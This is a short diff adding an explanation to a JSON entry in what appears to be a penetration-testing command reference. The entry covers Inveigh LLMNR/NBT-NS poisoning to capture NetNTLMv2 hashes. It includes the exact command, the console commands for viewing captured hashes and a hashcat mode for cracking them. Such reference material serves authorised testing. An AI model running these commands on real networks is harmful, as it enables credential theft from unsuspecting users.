@@ -96,5 +96,6 @@
       "label": "Common options",
       "command": ".\\Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y"
     }
-  ]
+  ],
+  "explain": "Poisons LLMNR/NBT-NS from a Windows foothold to capture NetNTLMv2 hashes (C# Inveigh):\n  .\\Inveigh.exe            start poisoning; the interactive console (GET NTLMV2UNIQUE, HISTORY, STOP) shows captured hashes live\nThe maintained C# build (preferred over the deprecated PS version); -LLMNR Y -NBNS Y -FileOutput Y enables the poisoners and writes hashes to disk. Crack captures with hashcat -m 5600."
 }
